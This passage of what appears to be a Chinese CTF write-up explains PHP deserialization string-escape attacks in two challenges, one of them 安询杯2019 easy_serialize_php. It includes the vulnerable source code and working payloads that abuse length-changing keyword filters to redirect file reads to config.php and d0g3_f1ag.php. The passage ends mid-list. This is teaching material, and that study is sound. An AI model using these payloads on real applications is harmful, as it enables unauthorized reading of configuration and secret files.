<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// update.php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="comment">// 中间删除了一些不必要的代码</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里发现<code>$profile[&#39;photo&#39;]</code>由一个路径+MD5文件拼接而成，只能控制<code>$file[&#39;name&#39;]</code>但是有被加密了，从而无法利用。再继续往下看，发现将序列化的文件进行了上传，跟进函数<code>update_profile</code>到<code>class.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// class.php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"> <span class="comment">// 以上还有数据库的基本操作，但后面无影响，因此不贴出来了</span></span><br><span class="line">   	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>然后看到<code>user</code>类的<code>update_profile</code>方法其中的<code>new_profile</code>参数则是<code>serialize($profile)</code>,这里的两个参数都进过<code>mysql</code>类中的<code>filter</code>方法进行过滤。注意<font color=red>这里的<code>new_profile</code>参数值是一个序列化后的数据，经过<code>filter</code>方法后可能改变数据结构</font>.我们需要的则是让<code>$profile[&#39;photo&#39;]=config.php</code>那么就可得到<code>flag</code>。但是按照正常程序会如以下执行。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;01234567890&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;123456@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;panda&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_profile</span> = filter(serialize(<span class="variable">$profile</span>));</span><br><span class="line">print_r(<span class="variable">$new_profile</span>);</span><br><span class="line"><span class="comment">// a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;01234567890&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;panda&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/f3b94e88bd1bd325af6f62828c8785dd&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里我们看到字符经过<code>filter</code>方法并没有发生改变，这是正常输入的时候，如果不正常的话的那么将<code>select</code>,<code>insert</code>,<code>update</code>,<code>delete</code>,<code>where</code>这些字符替换为hacker，细心点就会发现<code>where</code>替换后变成<code>hacker</code>字符长度会增加一。</li>
<li>PHP反序列化时以<code>;</code>作为分隔点,<code>&#125;</code>做为结束标志,根据长度来判断读取多少字符,我们无法控制<code>$profile[&#39;photo&#39;]</code>但是可以控制<code>nickname</code>,如果在这里截断(不在读取后面的内容)我们则可以构造后面的参数值。而<code>nickname</code>又进行了长度限制,<code>strlen</code>函数却无法处理数组,因此用数组进行绕过即可我们在这里截断,那么后面的则会被废弃不再读取，从而达到<code>$profile[&#39;photo&#39;]</code>参数可控。就类似于,下面用的是数组因此<code>niackname</code>后面为数组标示。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;01234567890&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;123456@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;panda&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/f3b94e88bd1bd325af6f62828c8785dd&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们则要构造如上的形式，就利用上面的<code>where</code>转换后字符长度加一的特性来构造我们的payload。计算下面的payload长度，因此需要34个长度的溢出，则需要34个<code>where</code>来构造因此拼接如下则是</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>刚好反序列化后<code>$profile[&#39;photo&#39;]=config.php</code>.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;01234567890&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;123456@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_profile</span> = filter(serialize(<span class="variable">$profile</span>));</span><br><span class="line">print_r(<span class="variable">$new_profile</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">print_r(unserialize(<span class="variable">$new_profile</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出展示</span></span><br><span class="line"><span class="comment">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;01234567890&quot;;s:5:&quot;email&quot;;s:13:&quot;123456<span class="doctag">@qq</span>.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/f3b94e88bd1bd325af6f62828c8785dd&quot;;&#125;</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [phone] =&gt; 01234567890</span></span><br><span class="line"><span class="comment">    [email] =&gt; 123456<span class="doctag">@qq</span>.com</span></span><br><span class="line"><span class="comment">    [nickname] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [0] =&gt; hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [photo] =&gt; config.php</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这个就像你有一条<code>204</code>米长的绳子，还有一把204米的尺子，这样刚好可以量完长度。但是你的绳子突然长长了，那么一次肯定就不够量了，剩下的只有下次再量。反序列化也是如此，他只根据他的长度来读取内容，剩下的他就不管了，用作下一次读取。</li>
</ul>
<h3 id="安询杯2019-easy-serialize-php"><a href="#安询杯2019-easy-serialize-php" class="headerlink" title="安询杯2019-easy_serialize_php"></a>安询杯2019-easy_serialize_php</h3><ul>
<li>反序列化后长度递减</li>
<li>一上来就给源码了，看了一下phpinfo发现自动包含了<code>d0g3_f1ag.php</code>文件。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>源码不多，首先来个<code>filter</code>过滤函数，后面给<code>Session</code>赋值，<code>extract</code>则可能变量覆盖。又有<code>file_get_contents()</code>参数可控的话又会出现任意文件读取。</li>
<li>老方法，看了哈文件读取的<code>$_SESSION[&#39;img&#39;]</code>参数不可控，<code>$_SESSION[&#39;user&#39;]</code>和<code>$_SESSION[&#39;function&#39;]</code>我们可以通过变量覆盖来控制。倘若按照平常来看的话，最后文件读取出来极大可能是乱码，因此现将文件读取路径<code>base64</code>加密再<code>sha1</code>加密，那么直接<code>base64</code>是解不出正常文件的。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;d0g3_f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sess</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;panda&#x27;</span>;</span><br><span class="line"><span class="variable">$sess</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$sess</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$file</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser_info</span> = filter(serialize(<span class="variable">$sess</span>));</span><br><span class="line">print_r(<span class="variable">$ser_info</span>);</span><br><span class="line"><span class="comment">// a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;panda&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:40:&quot;6b9b4b868ded1eb152045ebd5ea11b5be979d3ae&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>上面并没有触发过滤函数，如果触发了过滤函数，那么关键字则会被替换为空。假如我们的<code>user</code>的值或者<code>function</code>值中有黑名单中的函数，那么这可能不会成功的反序列化，因为序列化后的结构可能会被打乱。假如<code>$_SESSION[&#39;user&#39;]=&#39;phpflag&#39;</code>那么序列化后则是</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">40</span>:<span class="string">&quot;6b9b4b868ded1eb152045ebd5ea11b5be979d3ae&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>可以明显的看出<code>user</code>值为空了，但是长度依然不变，则在反序列化时会向后继续读取数据。我们可以构造数据吞并<code>function</code>，而且<code>function</code>的值可控，用来构造恶意数据(自己构造<code>img</code>的值，并在最后截断数据)，那么<code>img</code>则为可控数据了。我们需要构造的数据为,后面的数据为<code>d0g3_f1ag.php</code>的<code>base64</code>加密，因为后面要对其进行解密再读取文件。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ul>
